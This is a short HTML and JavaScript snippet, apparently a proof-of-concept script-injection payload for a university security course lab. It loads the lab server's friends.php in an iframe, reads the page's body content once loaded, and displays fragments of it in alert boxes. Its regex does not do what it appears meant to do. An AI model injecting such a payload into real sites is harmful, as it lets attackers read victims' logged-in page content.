<iframe id="hider" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>
<script>
    var ef = document.getElementById("hider");
    ef.addEventListener("load",function(){
       var conte= ef.contentWindow.document.body.innerHTML.match('^[^<br]*');
       alert(conte[0]);
       alert(conte[1]);
   });
</script>
